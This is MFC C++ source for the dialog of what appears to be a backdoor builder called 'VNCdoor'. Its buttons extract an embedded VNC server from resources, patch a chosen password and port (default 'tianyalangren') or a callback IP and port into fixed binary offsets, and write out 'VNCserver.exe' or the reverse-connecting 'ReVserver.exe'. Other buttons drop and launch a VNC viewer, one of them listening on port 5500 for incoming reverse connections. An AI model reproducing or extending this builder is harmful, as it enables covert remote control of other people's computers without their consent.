// VNCdoorDlg.cpp : implementation file
//

#include "stdafx.h"
#include "VNCdoor.h"
#include "VNCdoorDlg.h"
#include "Readme.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CVNCdoorDlg dialog

CVNCdoorDlg::CVNCdoorDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CVNCdoorDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CVNCdoorDlg)
	m_port1 = 5900;
	m_pass = _T("tianyalangren");
	m_backip = _T("127.0.0.1");
	m_port2 = 5500;
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
    

}

void CVNCdoorDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CVNCdoorDlg)
	DDX_Text(pDX, IDC_EDIT1, m_port1);
	DDV_MinMaxInt(pDX, m_port1, 1, 65535);
	DDX_Text(pDX, IDC_EDIT2, m_pass);
	DDV_MaxChars(pDX, m_pass, 20);
	DDX_Text(pDX, IDC_EDIT3, m_backip);
	DDX_Text(pDX, IDC_EDIT4, m_port2);
	DDV_MinMaxInt(pDX, m_port2, 1, 65535);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CVNCdoorDlg, CDialog)
	//{{AFX_MSG_MAP(CVNCdoorDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	ON_BN_CLICKED(IDC_BUTTON2, OnButton2)
	ON_BN_CLICKED(IDC_BUTTON4, OnButton4)
	ON_BN_CLICKED(IDC_BUTTON3, OnButton3)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CVNCdoorDlg message handlers

BOOL CVNCdoorDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	GetDlgItem(IDC_EDIT4)->SetWindowText("5500");
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CVNCdoorDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CVNCdoorDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CVNCdoorDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CVNCdoorDlg::OnButton1() 
{
	// TODO: Add your control notification handler code here
	
	//   
	char pass[20],port[6];
	char* Buff;
	const offset_port=96052;
	const offset_pass=96036;

    GetDlgItem(IDC_EDIT1)->GetWindowText(port,6);
    GetDlgItem(IDC_EDIT2)->GetWindowText(pass,20);

    //AfxMessageBox(port);
	//AfxMessageBox(pass);
	//CDialog::OnOK();
    HRSRC  hResInfo;
    HGLOBAL hResdata;
    DWORD dwSize,dwWritten;
    //文件句柄
    HANDLE hFile;
   
	TCHAR  Path[MAX_PATH] = {0};
    GetCurrentDirectory(MAX_PATH,Path);
	 
	if ( Path[strlen(Path)-1] != '\\')//最后一个元素
		strcat(Path,"\\");
	strcat(Path,"VNCserver.exe");
     //AfxMessageBox(Path);
    hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_SERV1),
                                 "serv");
       if( hResInfo == NULL)
    {
       AfxMessageBox("错误");
     
	}
  
    dwSize = SizeofResource(NULL, hResInfo);
	//AfxMessageBox(dwSize);
    hResdata = LoadResource(NULL, hResInfo);
    if(hResdata ==NULL)
	{
	AfxMessageBox("错误");
	}
   
    hFile = CreateFile(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                              0, NULL);
    if(hFile ==NULL)
	{
	AfxMessageBox("错误");
	}
	//写入文件
    WriteFile(hFile, (LPCVOID)LockResource(hResdata), dwSize, &dwWritten, NULL);
    Sleep(200);
    SetFilePointer(hFile,offset_pass, NULL, FILE_BEGIN);//重定位指
	Buff=&pass[0];
	WriteFile(hFile, Buff, 20, &dwWritten, NULL);//再次修改文件
    //AfxMessageBox(Buff);

	SetFilePointer(hFile,offset_port, NULL, FILE_BEGIN);//重定位指
	Buff=&port[0];
	WriteFile(hFile, Buff, 6, &dwWritten, NULL);//再次修改文件
    //AfxMessageBox(Buff);

	CloseHandle(hFile);
    AfxMessageBox("服务端创建成功!\r\nserver.exe");
}

void CVNCdoorDlg::OnButton2() 
{
	// TODO: Add your control notification handler code here
	
    HRSRC  hResInfo;
    HGLOBAL hResdata;
    DWORD dwSize,dwWritten;
    //文件句柄
    HANDLE hFile;
    
    char WindowsPath[MAX_PATH]={0};
    GetCurrentDirectory(MAX_PATH,WindowsPath);
    int len = strlen(WindowsPath)-1; 
    if(WindowsPath[len]!='\\')
    strcat(WindowsPath,"\\");
    strcat(WindowsPath,"vncviewer.exe");
	//MessageBox(NULL, "OK1",WindowsPath, MB_OK);
    hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_CLIENT1),
                                 "client");
	 //MessageBox(NULL, resID,resknid, MB_OK);
       if( hResInfo == NULL)
    {
      AfxMessageBox("错误");
     
	}
     
    dwSize = SizeofResource(NULL, hResInfo);
    hResdata = LoadResource(NULL, hResInfo);
    if(hResdata ==NULL)
     AfxMessageBox("错误");
   
    hFile = CreateFile(WindowsPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                              0, NULL);
    if(hFile ==NULL)
    AfxMessageBox("错误");
    WriteFile(hFile, (LPCVOID)LockResource(hResdata), dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    WinExec(WindowsPath,SW_SHOW);
}

void CVNCdoorDlg::OnButton4() 
{
	// TODO: Add your control notification handler code here
	HRSRC  hResInfo;
    HGLOBAL hResdata;
    DWORD dwSize,dwWritten;
    //文件句柄
    HANDLE hFile;
    
    char WindowsPath[MAX_PATH]={0};
    GetCurrentDirectory(MAX_PATH,WindowsPath);
    int len = strlen(WindowsPath)-1; 
    if(WindowsPath[len]!='\\')
    strcat(WindowsPath,"\\");
    strcat(WindowsPath,"vncviewer.exe");
	//MessageBox(NULL, "OK1",WindowsPath, MB_OK);
    hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_CLIENT1),
                                 "client");
	 //MessageBox(NULL, resID,resknid, MB_OK);
       if( hResInfo == NULL)
    {
      AfxMessageBox("错误");
     
	}
     
    dwSize = SizeofResource(NULL, hResInfo);
    hResdata = LoadResource(NULL, hResInfo);
    if(hResdata ==NULL)
     AfxMessageBox("错误");
   
    hFile = CreateFile(WindowsPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                              0, NULL);
    if(hFile ==NULL)
    AfxMessageBox("错误");
    WriteFile(hFile, (LPCVOID)LockResource(hResdata), dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
	strcat(WindowsPath," -listen");
    WinExec(WindowsPath,SW_SHOW);
	AfxMessageBox("监听端口:5500", MB_OK);
}

void CVNCdoorDlg::OnButton3() 
{
	// TODO: Add your control notification handler code here
	char ip[16],port[6];
	char* Buff;
	const offset_port=95016;
	const offset_ip=95024;

    GetDlgItem(IDC_EDIT3)->GetWindowText(ip,16);
    GetDlgItem(IDC_EDIT4)->GetWindowText(port,6);

    //AfxMessageBox(port);
	//AfxMessageBox(ip);
	//CDialog::OnOK();
    HRSRC  hResInfo;
    HGLOBAL hResdata;
    DWORD dwSize,dwWritten;
    //文件句柄
    HANDLE hFile;
   
	TCHAR  Path[MAX_PATH] = {0};

	GetCurrentDirectory(MAX_PATH,Path);
	 
	if ( Path[strlen(Path)-1] != '\\')
		strcat(Path,"\\");
	strcat(Path,"ReVserver.exe");
     //AfxMessageBox(Path);
    hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_SERV2),
                                 "serv");//资源ID+资源名
       if( hResInfo == NULL)
    {
       AfxMessageBox("错误");
     
	}
  
    dwSize = SizeofResource(NULL, hResInfo);
	//AfxMessageBox(dwSize);
    hResdata = LoadResource(NULL, hResInfo);
    if(hResdata ==NULL)
	{
	AfxMessageBox("错误");
	}
   
    hFile = CreateFile(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                              0, NULL);
    if(hFile ==NULL)
	{
	AfxMessageBox("错误");
	}

    WriteFile(hFile, (LPCVOID)LockResource(hResdata), dwSize, &dwWritten, NULL);
    Sleep(200);
    SetFilePointer(hFile,offset_ip, NULL, FILE_BEGIN);//重定位指
	Buff=&ip[0];
	WriteFile(hFile, Buff,15, &dwWritten, NULL);//再次修改文件
    //AfxMessageBox(Buff);

	SetFilePointer(hFile,offset_port, NULL, FILE_BEGIN);//重定位指
	Buff=&port[0];
	WriteFile(hFile, Buff, 6, &dwWritten, NULL);//再次修改文件
    //AfxMessageBox(Buff);

	CloseHandle(hFile);
    AfxMessageBox("服务端创建成功!\r\nReVserver.exe");
}

void CVNCdoorDlg::OnOK() 
{
	// TODO: Add extra validation here
	
	//CDialog::OnOK();
	CReadme  dlg;
	dlg.DoModal();

}
